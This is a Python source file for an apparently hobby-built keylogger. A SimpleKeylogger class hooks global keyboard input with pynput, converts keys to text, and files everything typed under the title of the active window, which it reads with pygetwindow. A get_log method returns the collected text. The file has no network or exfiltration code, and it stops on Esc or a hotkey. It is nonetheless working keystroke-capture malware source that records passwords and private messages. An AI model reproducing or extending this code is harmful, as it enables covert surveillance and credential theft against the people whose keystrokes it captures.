from keyboard import is_pressed

from keylogger.interfaces import IKeylogger
from pynput import keyboard
import pygetwindow as gw


def key_to_char(key) -> str:
    """
    Utility function to convert a pynput key event to a printable character.

    Args:
        key (keyboard.Key or keyboard.KeyCode): The pressed key.

    Returns:
        str: A printable character or a formatted representation for special keys.
    """
    if isinstance(key, keyboard.KeyCode):
        return key.char  # Regular key (letters, numbers, symbols)

    # Mapping for special keys
    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.esc: "[ESC]",
    }

    return special_keys.get(key, f"[{key.name}]")  # Default for unknown keys


class SimpleKeylogger(IKeylogger):
    """
    A simple keylogger implementation using the pynput library.

    This keylogger records keystrokes and associates them with the currently active window.

    Note: This class is NOT thread-safe because it uses atomic buffer swapping instead of locks. So if it will be
    used in a multiple threads, thread safety mechanism should be implemented.

    Attributes:
        buffer (dict): Stores the logged keystrokes, categorized by active window.
        running (bool): Indicates whether the keylogger is running.
        listener (keyboard.Listener): The pynput keyboard listener.
    """

    def __init__(self):
        """Initializes the keylogger."""
        self.buffer = {}  # Stores keystrokes per active window
        self.running = False
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)

    def on_press(self, key):
        """
        Callback function triggered when a key is pressed.

        Args:
            key (keyboard.Key or keyboard.KeyCode): The pressed key.
        """
        if is_pressed("shift+alt+p"):  # TODO: Modify the shortcut, and better implementation maybe.
            self.stop()
        try:
            key_pressed = str(key_to_char(key))
        except Exception as e:
            print(f"Error processing key: {e}")
            return

        active_window = self.get_active_window()

        if active_window not in self.buffer:
            self.buffer[active_window] = ""
        self.buffer[active_window] += key_pressed

    def on_release(self, key):
        """
        Callback function triggered when a key is released.

        Args:
            key (keyboard.Key): The released key.
        """
        if key == keyboard.Key.esc:
            self.stop()

    def start(self):
        """Starts listening for keystrokes."""
        self.running = True
        self.listener.start()

    def stop(self):
        """Stops the keylogger."""
        self.running = False
        self.listener.stop()

    def get_log(self) -> dict:
        """
        Retrieves the collected keystrokes and clears the buffer.

        Uses atomic swapping to avoid race conditions.

        Returns:
            dict: The logged keystrokes categorized by active window.

        Note: This method is NOT thread-safe if accessed from multiple threads.
        """
        old_buffer, self.buffer = self.buffer, {}
        return old_buffer

    def get_active_window(self) -> str:
        """
        Gets the title of the currently focused application.

        Returns:
            str: The title of the active window or "Unknown" if unavailable.
        """
        try:
            active_window = gw.getActiveWindow()
            return str(active_window.title) if active_window else "Unknown"
            # TODO: remove the chars in the beginning and end of the returned title.
        except Exception as e:
            print(f"Error getting active window: {e}")
            return "Unknown"
